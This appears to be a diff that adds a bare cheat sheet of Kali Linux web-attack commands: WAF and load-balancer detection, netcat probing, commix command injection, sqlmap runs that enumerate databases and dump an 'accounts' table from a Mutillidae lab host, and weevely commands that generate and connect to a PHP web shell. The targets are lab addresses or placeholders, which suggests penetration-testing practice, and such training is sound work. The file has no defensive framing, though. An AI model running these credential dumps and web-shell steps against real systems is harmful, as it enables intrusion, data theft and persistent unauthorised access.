@@ -1,1 +1,17 @@
 
+nmap -p 80 --script http-waf-detect.nse target.com
+wafw00f target.com
+lbd target.com
+nc -vv target.com port
+BlindElephant.py <website.com> joomla
+Dirbuster
+httrack http://targetwebapp/ -O outputfolder
+burpsuite
+websploit
+hydra-gtk
+commix -url=http://192.168.0.120/mutillidae/index.php?popupnotificationcode=5L5&page=dns-lookup.php -data="target_host=127.0.0.1" -headers="Accept-Language:fr\nETAG:123\n"  
+root@kali:~# sqlmap -u 'http://192.168.75.129/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-  button=View+Account+Details' --dbs 
+root@kali:~# sqlmap -u 'http://192.168.75.129/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-  button=View+Account+Details' -D nowasp --tables 
+root@kali:~# sqlmap -u 'http://192.168.75.129/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-  button=View+Account+Details' -D nowasp - T accounts --dump
+root@kali:~# weevely generate <password><path>  
+root@kali:~# weevely http://<target IP address><directory><password>  
